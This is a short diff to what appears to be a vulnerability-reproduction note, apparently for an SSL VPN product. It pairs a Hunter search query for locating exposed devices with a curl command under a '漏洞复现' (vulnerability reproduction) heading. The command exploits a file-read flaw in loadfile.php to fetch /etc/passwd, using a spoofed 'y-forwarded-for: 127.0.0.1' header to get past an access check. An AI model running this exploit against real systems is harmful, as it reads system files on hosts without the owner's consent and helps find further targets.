@@ -7,6 +7,7 @@
 ## hunter:
 web.body="LogInOut.php?type=logout"
 
+## 漏洞复现
 ```
 curl --insecure  https://<host>:85/svpn_html/loadfile.php?file=/etc/./passwd -H "y-forwarded-for: 127.0.0.1"
 
